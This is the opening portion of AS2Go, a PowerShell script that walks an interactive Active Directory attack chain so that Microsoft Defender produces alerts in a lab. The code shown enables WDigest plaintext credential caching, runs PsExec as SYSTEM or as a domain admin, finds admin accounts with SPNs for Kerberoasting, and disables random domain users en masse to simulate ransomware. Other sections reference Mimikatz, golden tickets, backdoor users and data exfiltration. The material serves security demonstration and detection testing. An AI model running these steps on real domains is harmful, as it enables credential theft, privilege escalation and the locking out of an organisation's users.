<#
.SYNOPSIS

Attack scenario to GO - along the kill-chain (AS2Go)

Requirements:

- Certify.exe
- Mimikatz.exe
- Rubeus.exe
- NetSess.exe
- PsExec.exean
- OpenSSL.exe
- AS2Go-encryption.ps1 

.DESCRIPTION

AS2Go is an acronym for Attack Scenario To Go. 
AS2Go is written in PowerShell and goes along the cyber kill-chain (with stops like Reconnaissance, Lateral Movement, Sensitive Data Access & Exfiltration, and Domain Dominance) 
My goal is to create expressive and representative Microsoft Defender for Endpoint  & Microsoft Defender for Identity alerts or, rather, Microsoft 365 Defender & Microsoft Sentinel incidents.

.NOTES

last update: 2023-08-27
File Name  : AS2Go.ps1 | Version 2.8.x
Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi


.EXAMPLE
PS> cd C:\temp\AS2GO
PS> .\AS2Go.ps1

.EXAMPLE
PS> .\AS2Go.ps1
Purpose: Run the script with user interactions

.EXAMPLE
PS> .\AS2Go.ps1 -Continue
Purpose: Continue the use case or does not start the use case from the beginning

.EXAMPLE
PS> .\AS2Go.ps1 -SkipImages
Purpose: Do not show the images in the browser

.EXAMPLE
PS> .\AS2Go.ps1 -SkipCompromisedAccount
Purpose: Skip the selection or confirmation, which account are you using

.EXAMPLE
PS> .\AS2Go.ps1 -SkipPasswordSpray
Purpose: Skip the complete Password Spray Attack

.EXAMPLE
PS> .\AS2Go.ps1 -SkipPwSpayWithRubeus
Purpose: Skip the Password Spray Attack with Rubeus.exe

.EXAMPLE
PS> .\AS2Go.ps1 -SkipReconnaissance
Purpose: Skip the attack level Reconnaissance

.EXAMPLE
PS> .\AS2Go.ps1 -SkipSensitiveDataAccess
Purpose: Skip the attack level Access Sensitive Data

.EXAMPLE
PS> .\AS2Go.ps1 -SkipDataExfiltration
Purpose: Skip the attack level Data Exfiltration

.EXAMPLE
PS> .\AS2Go.ps1 -SkipDomainPersistence
Purpose: Skip the attack level Domain Persistence

.EXAMPLE
PS> .\AS2Go.ps1 -SkipDataExfiltration
Purpose: Skip the attack level Data Exfiltration

.EXAMPLE
PS> .\AS2Go.ps1 -SkipPrivilegeEscalation
Purpose: Skip the attack level Privilege Escalation

.EXAMPLE
PS> .\AS2Go.ps1 -EnableLogging
Purpose: Enable the logging function. By default, the log file is .\AS2Go.ps1.log

.EXAMPLE
PS> .\AS2Go.ps1 -EnableLogging -Continue -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
Purpose: Of course, a combination of multiple switches is also possible. This commands starts direct the Priviledge Escalation.

.EXAMPLE
PS> .\AS2Go.ps1 -Continue -EnableLogging -SkipImages -SkipPasswordSpray -SkipCompromisedAccount -SkipReconnaissance -SkipSensitiveDataAccess -SkipPopup
Purpose: Of course, a combination of multiple switches is also possible. This commands starts direct the Priviledge Escalation.


.LINK
https://herrHoZi.com
https://github.com/herrhozi
https://www.crowdstrike.com/cybersecurity-101/kerberoasting/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin
https://learn.microsoft.com/en-us/defender-for-identity/playbook-reconnaissance
https://github.com/GhostPack/Certify
https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates



#>
#Check if the current Windows PowerShell session is running as Administrator. 
#If not Start Windows PowerShell by  using the Run as Administrator option, and then try running the script again.

#Requires -RunAsAdministrator

Param (  
    [switch]$UnAttended,
    [switch]$Continue,
    [Switch]$EnableLogging,
    [switch]$SkipImages,
    [switch]$SkipPopup,
    [switch]$SkipPasswordSpray,
    [switch]$SkipCompromisedAccount,
    [switch]$SkipPwSpayWithRubeus,
    [switch]$SkipReconnaissance,
    [switch]$SkipPrivilegeEscalation,
    [switch]$SkipSensitiveDataAccess,
    [switch]$SkipDataExfiltration,
    [switch]$SkipDomainPersistence,
    [switch]$SkipForgeAuthCertificates, 
    [switch]$SkipKerberoastingAttack, 
    [switch]$DeveloperMode
  )



################################################################################
######                                                                     #####
######                        Change log                                   #####
######                                                                     #####
################################################################################

$lastupdate = "2023-08-29"
$version = "2.8.6"

# 2023-08-29 | v2.8.6 |  WIP
# 2023-08-29 | v2.8.5 |  Update Function Get-KerberosTGT
# 2023-08-27 | v2.8.4 |  Update Function New-PrivilegeEscalationRecommendation
# 2023-08-26 | v2.8.3 |  Update Function Get-VulnerableCertificateTemplate (replace Certify by LDAP Query)
# 2023-08-26 | v2.8.2 |  Replace Function Get-EnterpriseCAName by Get-EnrollmentService (replace Certify by LDAP Query)
# 2023-08-25 | v2.8.1 |  Add Switches -SkipPopup
# 2022-04-24 | v2.8.0 |  Upload to Github
# 2023-04-24 | v2.7.9 |  Update Help / Examples
# 2023-04-23 | v2.7.8 |  Update Functions Get-KerberosTGT & Start-ConvertingToPfxFromPem - due to double file names in console
# 2023-04-23 | v2.7.7 |  Update Function Start-RequestingCertificate - file da-xxxxx.pem file be filled automatically now
# 2023-04-11 | v2.7.6 |  Update Function New-Backdoor User due to Get-ADPrincipalGroupMembership does not work on Windows 11
# 2023-04-11 | v2.7.5 |  Update Function New-PrivilegeEscalationRecommendation
# 2023-04-11 | v2.7.4 |  Add Function Get-AdminWithSPN
# 2023-04-10 | v2.7.3 |  Add Function New-PrivilegesEscalationtoSystem
# 2023-04-10 | v2.7.2 |  Add Function Get-CachedKerberosTicketsClient
# 2023-04-08 | v2.7.1 |  Add Function Search-ProcessForAS2GoUsers
# 2023-04-06 | v2.7.0 |  Add Function Search-ADGroupMemberShip 
# 2023-04-03 | v2.6.9 |  Update Function New-GoldenTicket
# 2023-03-30 | v2.6.8 |  Update Privilege Escalations Section
# 2023-03-28 | v2.6.7 |  Add Function New-KeyValue
# 2023-03-28 | v2.6.6 |  Update Functions Add-KeyValue & Set-Keyvalue and update as2go.xml file (schema)
# 2023-03-28 | v2.6.5 |  Add Function New-PrivilegeEscalationRecommendation 
# 2023-03-26 | v2.6.4 |  Add Function Disable-As2GoUser
# 2023-03-25 | v2.6.3 |  Update Function Reset-As2GoPassword
# 2023-03-19 | v2.6.2 |  Add Switches like -UnAttended -EnableLogging -Continue -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
# 2022-12-01 | v2.6.0 |  Upload to Github
# 2022-11-27 | v2.5.9 |  Add Functions Get-ComputerInformation & AS2Go
# 2022-11-24 | v2.5.8 |  Add Function Get-ADGroupNameBasedOnRID
# 2022-11-19 | v2.5.7 |  Add new color schema for next command
# 2022-11-13 | v2.5.6 |  Add Attack - Steal or Forge Authentication Certificates
# 2022-11-12 | v2.5.5 |  Update Function Get-DirContent
# 2022-11-11 | v2.5.4 |  Add Command '| out-host' after write-host in sub functions
# 2022-11-06 | v2.5.3 |  Add developer mode switch, add -ScriptBlock {} and regions to source code
# 2022-11-05 | v2.5.2 |  Add Function New-PasswordSprayAttack
# 2022-10-15 | v2.5.1 |  Add Function Kerberoasting
# 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
# 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser
# 2022-09-20 | v2.0.9 |  Update Get-LocalGroupMember -Group "Administrators" | ft
# 2022-09-20 | v2.0.8 |  Update Function New-BackDoorUser
# 2022-09-09 | v2.0.7 |  Update Function Start-AS2GoDemo
# 2022-08-09 | v2.0.6 |  Update Function Start-Reconnaissance
# 2022-01-21 | v2.0.5 |  Update Function Restart-VictimMachines
# 2022-01-18 | v2.0.4 |  Update Function New-RansomareAttack
# 2022-01-11 | v2.0.3 |  Add    Function New-RansomareAttack


################################################################################
######                                                                     #####
######                        Global Settings                              #####
######                                                                     #####
################################################################################

#region Global Settings

[bool]$showStep = $true # show the steps in an image
[bool]$skipstep = $false # show the steps in an image

$PublishedRiskyTemplates = New-Object System.Collections.ArrayList





$path = Get-Location
$scriptName = $MyInvocation.MyCommand.Name
$scriptLog = "$path\$scriptName.log"
$configFile = "$path\AS2Go.xml"
$exfiltration = "$path\Exfiltration"
$exit = "x"
$yes = "Y"
$no = "N"
$PtH = "H"
$PtT = "T"
$PtC = "C"
$KrA = "K"
$CfM = "M"
$GoldenTicket = "GT"
$InitialStart = "Start"
$PrivledgeAccount = $no

#$tmp = "$path\AS2Go.tmp"
$RUBEUS = "Rubeus.exe"

$stage00 = "Compromised User Account"
$stage05 = "Bruce Force Or Pw Spray"
$stage10 = "Reconnaissance"
$stage20 = "Privilege Escalation"
$stage25 = "Steal or Forge Authentication Certificates"
$stage27 = "Kerberoasting Attack"
$stage30 = "Access Sensitive Data"
$stage35 = "Exfiltrate Data"
$stage40 = "Domain Compromised"
$stage50 = "COMPLETE"


$global:FGCHeader = "YELLOW"
$global:FGCCommand = "Green"
$global:FGCQuestion = "DarkMagenta"
$global:FGCHighLight = "DarkMagenta"
$global:FGCError = "Red"
$global:BDSecurePass = ""
$global:BDUser = ""
$global:BDCred = ""


$fgcS = "DarkGray"    # Switch - DarkGray
$fgcC = "Yellow"  # Command
$fgcV = "Cyan"    # Value
$fgcF = "White"
$fgcH = "Yellow" 
$fgcR = "Green"   #result
$fgcG = "Gray"

$WinVersion = [System.Environment]::OSVersion.Version.ToString()

#$GroupDA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-512") }).name
#$GroupEA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-519") }).name
#$GroupGPO = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-520") }).name

#endregion Global Settings

################################################################################
######                                                                     #####
######                     All Functions      (get-verb)                   #####
######                                                                     #####
################################################################################

function MyTemplate {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $param1, [string] $para2)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $true
}

#region AS2Go Functions


function Set-UseLogonCredential {

    ################################################################################
    #####                                                                      ##### 
    #####    Set value for UseLogonCredential to 1                             #####                             
    #####                                                                      #####
    ################################################################################

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "      Enable UseLogonCredential to read credentials from memory     "
    Write-Host "____________________________________________________________________`n" 

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Set-ItemProperty ", "-Path ", "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest ", "-Name " , "UseLogonCredential ", "-Value " , "1"`
                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV 
    Write-Host ""
    
    
    $question = "Do you want to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $no

    If ($answer -eq $yes) {
        Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -value 1
        Invoke-Command -ScriptBlock { gpupdate /force /wait:0 }
        Write-log -Message "     Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -value 1"
    }

    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"
}

function New-PrivilegesEscalationtoSystem { 
    ################################################################################
    #####                                                                      ##### 
    #####    Start a process as a different user on the victim machine         #####                                
    #####                                                                      #####
    ################################################################################



    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    Update-WindowTitle -NewTitle "PsExec Attack"
    Set-KeyValue -key "LastStage" -NewValue "PsExec Attack"

    Do {

        $domain = $env:USERDOMAIN

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "            Select your preferred PSExec Command                  "
        Write-Host "____________________________________________________________________`n" 

        Write-Host "Enter " -NoNewline 
        Write-Host "H " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$helpdeskuser ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

        Write-Host "Enter " -NoNewline 
        Write-Host "D " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$domainadmin ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

        Write-Host "Enter " -NoNewline 
        Write-Host "S " -NoNewline -ForegroundColor Yellow
        Write-Host "to run: " -NoNewline
        Write-Highlight -Text (".\PSExec.exe ", "-d -s -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV

        $question = " -> Enter your command! Default "
        $answer = Get-Answer -question $question -defaultValue "H"
        Write-Log -Message "    >> using $answer"
        Write-Host "`n"
        If ($answer -eq "H") {
            Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$helpdeskuser ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { .\PsExec.exe -u $domain\$helpdeskuser -d -h -i cmd.exe -nobanner} #| Out-Host

        }
        elseif ($answer -eq "S") {
            Write-Highlight -Text (".\PSExec.exe ", "-d -s -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { .\PSExec.exe -d -s -i cmd.exe -nobanner} #| Out-Host

        }
        elseif ($answer -eq "D") {
            Write-Highlight -Text (".\PSExec.exe ", "-u ", "$domain\$domainadmin ", "-d -h -i ", "cmd.exe") -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
            Invoke-Command -ScriptBlock { .\PsExec.exe -u $domain\$domainadmin -d -h -i cmd.exe -nobanner} #| Out-Host

        }
        else {
            <# Action when all if and elseif conditions are false #>
        }
        Write-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "        ??? REPEAT | PSExec Command  ???           "
        Write-Host "____________________________________________________________________`n" 

        # End "Do ... Until" Loop?
        $question = "Do you need to REPEAT this attack level - Y or N? Default "
        $repeat = Get-Answer -question $question -defaultValue $no

    } Until ($repeat -eq $no)


    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    #return $true
}

function Search-ProcessForAS2GoUsers {

    ################################################################################
    #####                                                                      ##### 
    #####        Check for possible passwords in the memory                    #####                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $user)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################
    
    [bool]$foundUser = $false

    $result = Get-Process -IncludeUserName |  Where-Object { $_.UserName -like "*$user" }  | Select-Object Id, Name, Username, Path
    If ($result) { $foundUser = $true }

    Write-Log -Message "    >> found $user - $foundUser!"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $foundUser
}

function Get-AdminWithSPN {

    ################################################################################
    #####                                                                      ##### 
    #####        Check for possible passwords in the memory                    #####                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $user)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################
    
    [bool]$foundAdminWithSPN = $false

    try {

        $result = Get-ADUser -Filter { (adminCount -eq 1) -and (servicePrincipalName -like "*") -and (samAccountName -ne "krbtgt") } -Properties servicePrincipalName, adminCount -ErrorAction Stop
        If ($result) { $foundAdminWithSPN = $true }
          

    }
    catch {
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }

    Write-Log -Message "    >> found Admin with SPN $foundAdminWithSPN!"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $foundAdminWithSPN
}

function Get-CachedKerberosTicketsClient {

    ################################################################################
    #####                                                                      ##### 
    #####        Check for possible passwords in the memory                    #####                                 
    #####                                                                      #####
    ################################################################################

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################
    
    #currently cached Kerberos tickets
    $results = @()
    $results = Invoke-Command -ScriptBlock { klist }
    If ($results.count -ge 5)
    {
        $result = $results[5].Split(":")[-1].trim()
    }
    else {
        $result = "Cached Tickets: (0)"
    }

    Write-Log -Message "    >> found $user - $foundUser!"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $result.ToUpper()
}

function Search-ADGroupMemberShip {

    ################################################################################
    #####                                                                      ##### 
    #####    check if name (AD Object is member of a special group             #####                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $name, [string] $rID)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    [bool]$result = $false
    

    
    try {
       
        $results = Get-ADPrincipalGroupMembership -Identity $name | Select-Object sid, name -ErrorAction Stop
        $temp = $results | Where-Object { $_.sid -like "*$rID" } | Select-Object name
        If ($temp) { $result = $true }

    }
    catch {

        try {
            $tempGroupName = Get-ADGroupNameBasedOnRID -RID $rID
            $results = Get-AdGroupMember -Identity $tempGroupName
            $temp = $results | Where-Object { $_.name -like "*$name" } | Select-Object name -ErrorAction Stop
            If ($temp) { $result = $true }
        }
        catch {
            <#Do this if a terminating exception happens#>
            write-host "Error: " -NoNewline -ForegroundColor Red
            Write-Host $_
        }


    }
        

    Write-Log -Message "    >> $name is memberof $rID - $result"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $result
}

function Access-Directory {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $directory
    )

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-ChildItem ", "$directory ", "-filter ", "*.*" `
        -Color $fgcC, $fgcF, $fgcS, $fgcF
    Write-Host ""


    Try {
        Get-ChildItem -Path $directory -Force -ErrorAction Stop | Out-Host
        #Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion | Out-Host
    }
    catch {
        Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError | Out-Host
    }

    return
    #####
    Write-Log -Message $directory
    Write-Log -Message "### End Function $myfunction ###"
}


function Confirm-PoSHModuleAvailabliy {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $PSModule
    )

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Import-Module $PSModule -ErrorAction SilentlyContinue

    If ($null -eq (Get-Module $PSModule)) {
        Write-Host ""
        Write-Warning "The PowerShell '$PSModule' Module is missing!!"
        Write-host    "`nPlease install the PowerShell $PSModule Module" 
        Write-host    "e.g. https://theitbros.com/install-and-import-powershell-active-directory-module"
        Write-Host ""
        Write-Log -Message "The PowerShell '$PSModule' Module is missing!!"
        Pause
    }
    else {

    }

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function Disable-AS2GoUser {

    ################################################################################
    #####                                                                      ##### 
    #####                   Disable x random demo users                        #####                                 
    #####                                                                      #####
    ################################################################################
    Param([string] $Domain, [string] $SearchBase, [int] $NoU)


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    ################## main code | out- host #####################
  
    Write-Log -Message "### Start Function $myfunction ###"

    $attributes = @("name", "samaccountname", "Enabled", "passwordlastset", "whenChanged", "homePhone")
    $StartDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")

    $ADUSers = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $attributes | Sort-Object { Get-Random } | Select-Object -First $NoU

    $Step = 0
    $TotalSteps = $ADUsers.Count
  
    [bool] $StopDisable = $false
    $epochseconds = (Get-Date (Get-Date).ToUniversalTime() -UFormat %s).Replace(".", "")

    Set-KeyValue -key "LastIdentifier" -NewValue $epochseconds
        
    Foreach ($ADUSer in $ADUsers) {
        $Step += 1
        $user = $Domain + "\" + $ADUSer.samaccountname
        $progress = [int] (($Step) / $TotalSteps * 100)
        Write-Progress -Id 0 -Activity "Disable AD User $User" -status "Completed $progress % of disabling AD Users!" -PercentComplete $progress         
        
        Try {
            Disable-ADAccount -Identity  $ADUSer.samaccountname  -ErrorAction stop  
            Set-ADUser -Identity $ADUSer.samaccountname -HomePhone $epochseconds
        }
        catch {
            $StopDisable = $true
        }
       
        #If ($StopDisable  = $true) {break}
           
    }

    # close the process bar
    Start-Sleep 1
    Write-Progress -Activity "Disable AD User $User" -Status "Ready" -Completed

    #list the affected users
    $attributes = @("name", "samaccountname", "Enabled", "passwordlastset", "whenChanged")
    Get-ADUser -SearchBase $searchbase -Filter 'homePhone -like $epochseconds' -Properties $attributes | Select-Object $attributes | Sort-Object samaccountname  | Format-Table | Out-Host
    Get-ADUser -SearchBase $searchbase -Filter 'homePhone -like $epochseconds' -Properties $attributes | Select-Object $attributes | Select-Object -First 1      | Format-Table | Out-Host

    $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
    $duration = NEW-TIMESPAN -Start $StartDate -End $EndDate
    Write-Host "  'Game over' after just " -NoNewline; Write-Host "$duration [h]`n" -ForegroundColor $fgcH | Out-Host
    Write-Host "" | Out-Host
    
    if ($UnAttended) { Start-Sleep 2 } else { Pause } 

    Write-Log -Message "    >> using: $epochseconds"
    #####
    Write-Log -Message "### End Function $myfunction ###"
    return $epochseconds
}


Function Get-Answer {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                                                       #####                                 
    #####                                                                      #####
    ################################################################################

    Param([string] $question, [string] $defaultValue)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

  
    If ($question.ToLower().Contains("repeat")) {
        write-host "`n   $question"  -ForegroundColor Cyan -NoNewline
    }
    else {
        write-host "`n   $question"  -ForegroundColor $global:FGCQuestion -NoNewline
    }
    
    $prompt = Read-Host "[$($defaultValue)]" 
    if ($prompt -eq "") { $prompt = $defaultValue } 

    Write-Log -Message "    >> Q:$question  A:$prompt"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $prompt.ToUpper()
}

function Get-AS2GoSettings {


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Write-Host "____________________________________________________________________`n" 
    Write-Host "                      Check and Update the Settings                 "
    Write-Host "____________________________________________________________________`n" 

    Do {

     
        #read values from the system
        
        try {
            $DomainName = (Get-ADDomain).DNSRoot
            Set-KeyValue -key "fqdn" -NewValue $DomainName 
        }
        catch {
            <#Do this if a terminating exception happens#>
        }
        
        
        
        try {
            $DomainSID = (Get-ADDomain).DomainSID.Value
            Set-KeyValue -key "DomainSID" -NewValue $DomainSID
        }
        catch {
            <#Do this if a terminating exception happens#>
        }
        
        
        
        
        
        
        
        $myViPC = $env:COMPUTERNAME
        $myDC = $env:LOGONSERVER.Substring(2) 

        #Set-KeyValue -key "fqdn" -NewValue $DomainName
        #Set-KeyValue -key "DomainSID" -NewValue $DomainSID
        Set-KeyValue -key "myViPC" -NewValue $myViPC
        Set-KeyValue -key "mydc" -NewValue $myDC


        #read values from AS2Go.xml config file
        $myDC = Get-KeyValue -key "myDC" 
        $mySAW = Get-KeyValue -key "mySAW" 
        $myViPC = Get-KeyValue -key "myViPC"
        $fqdn = Get-KeyValue -key "fqdn"
        $pthntml = Get-KeyValue -key "pthntml"
        $krbtgtntml = Get-KeyValue -key "krbtgtntml"
        $OpenSSL = Get-KeyValue -key "OpenSSL"
        $globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
        $ticketsUNCPath = Get-KeyValue -key "ticketsPath"
        $ticketsDir = Get-KeyValue -key "ticketsDir"
        $time2reboot = Get-KeyValue -key "time2reboot"
        $BDUsersOU = Get-KeyValue -key "BDUsersOU"
        $MySearchBase = Get-KeyValue -key "MySearchBase"
        $OfflineDITFile = Get-KeyValue -key "OfflineDITFile"
        $myAppServer = Get-KeyValue -key "myAppServer"
        $honeytoken = Get-KeyValue -key  "honeytoken"

        # fill the arrays
        $MyParameter = @("Logon Server / DC         ", `
                "Victim PC                 ", `
                "Admin PC                  ", `
                "Application Server        ", `
                "Help Desk Group           ", `
                "MDI Honeytoken            ", `
                "Domain Name               ", `
                "Domain siD                ", `
                "NTML Hash Helpdesk        ", `
                "NTML Hash krbtgt          ", `
                "Seconds to reboot         ", `
                "AD Search Base            ", `
                "OU for BD User            ", `
                "Tickets UNC Path (suffix) ", `
                "Tickets Directory         ", `
                "NTDS Dit File (Backup)    ", `
                "OpenSSL start path        ")

        $MyValue = @($myDC, `
                $myViPC, `
                $mySAW, `
                $myAppServer, `
                $globalHelpDesk, `
                $honeytoken, `
                $DomainName, `
                $DomainSID, `
                $pthntml, `
                $krbtgtntml, `
                $time2reboot, `
                $MySearchBase, `
                $BDUsersOU, `
                $ticketsUNCPath, `
                $ticketsDir, `
                $OfflineDITFile, `
                $OpenSSL)

        $MyKey = @("myDC", `
                "myViPC", `
                "mySAW", `
                "myAppServer", `
                "globalHelpDesk", `
                "honeytoken", `
                "DomainName", `
                "DomainSID", `
                "pthntml", `
                "krbtgtntml", `
                "time2reboot", `
                "MySearchBase", `
                "BDUsersOU", `
                "ticketsUNCPath", `
                "ticketsDir", `
                "OfflineDITFile", `
                "OpenSSL")



        # list the current values
        for ($counter = 0; $counter -lt $MyParameter.Length; $counter++ ) {
    
            write-host ([string]$counter).PadLeft(4, ' ') ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter)
            #write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor $fgcH
        }

        If ($UnAttended) {
            $prompt = $yes
        }
        else {
            $question = " -> Are these values correct - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }

        if ($prompt -ne $yes) {
            $counter = 10
            $question = " -> Please enter the desired setting number. Default "
            $counter = Get-Answer -question $question -defaultValue $counter

            try {
                write-host "`n`nChange value for " $MyParameter.Get($counter) " = " $MyValue.Get($counter) -ForegroundColor $global:FGCCommand
                $newvaulue = Read-Host "Please type in the new value"
                Set-KeyValue -key $MyKey.Get($counter)  -NewValue $newvaulue
            }
            catch {
                write-host  "$counter = Falscher Wert"
            }

            Finally {
                # list the current values
                Get-AS2GoSettings
            }

        }


        If ($UnAttended) {
            $repeat = $no
        }
        else {
            $question = "Do you need to update more settings - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no
        }

        # End "Do ... Until" Loop?


        # If ($skipstep) { break }   
   
    } Until ($repeat -eq $no)


    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Get-ADGroupNameBasedOnRID {

    ################################################################################
    #####                                                                      ##### 
    #####    Get Group name based on RID independent from the OS language      #####                              
    #####                                                                      #####
    ################################################################################


    Param([string] $RID)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    $GroupName = $null
    $GroupName = (Get-ADGroup -Filter * -Properties name | Where-Object { ($_.SID -like "*$RID") }).name
    
    If ($null -eq $GroupName) {

        switch ($RID) {
            "-512" { $GroupName = "Domain Admins"; Break }
            "-518" { $GroupName = "Schema Admins"; Break }
            "-519" { $GroupName = "Enterprise Admins"; Break }
            "-520" { $GroupName = "Group Policy Creator Owners"; Break }
            "-525" { $GroupName = "Protected Users"; Break }
            "-548" { $GroupName = "Account Operators"; Break }
            Default { "Nomatches" }
        }

    }

    Write-Log -Message "    >> using AD Group - $GroupName"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $GroupName
}

function Get-ADUserNameBasedOnRID {

    ################################################################################
    #####                                                                      ##### 
    #####    Get User name based on RID independent from the OS language      #####                              
    #####                                                                      #####
    ################################################################################


    Param([string] $RID)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    $UserName = $null
    $UserName = (Get-ADUser -Filter * -Properties name | Where-Object { ($_.SID -like "*$RID") }).name
    
    If ($null -eq $UserName) {

        switch ($RID) {
            "-500" { $UserName = "Adminstrator"; Break }
            "-518" { $UserName = "Schema Admins"; Break }
            "-519" { $UserName = "Enterprise Admins"; Break }
            "-520" { $UserName = "Group Policy Creator Owners"; Break }
            "-525" { $UserName = "Protected Users"; Break }
            Default { "Nomatches" }
        }

    }

    Write-Log -Message "    >> using AD Group - $UserName"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $UserName
}

function Get-ComputerInformation {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $computer)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    $summary = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

    try{
        $property = Get-ADComputer -Identity  $computer -Properties name, operatingSystem, operatingSystemVersion -ErrorAction Stop
    
        $Name = $property.name.PadRight(16, [char]32)
        $prefix = $property.operatingSystem.PadRight(33, [char]32)
        $suffix = $property.operatingSystemVersion
    
        $summary = "$Name | $prefix | $suffix"
    }
    catch{
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }
    



    Write-Log -Message "    >> using $summary"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $summary
}

function Get-FileVersion {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $filename
    )

    $myfunction = Get-FunctionName
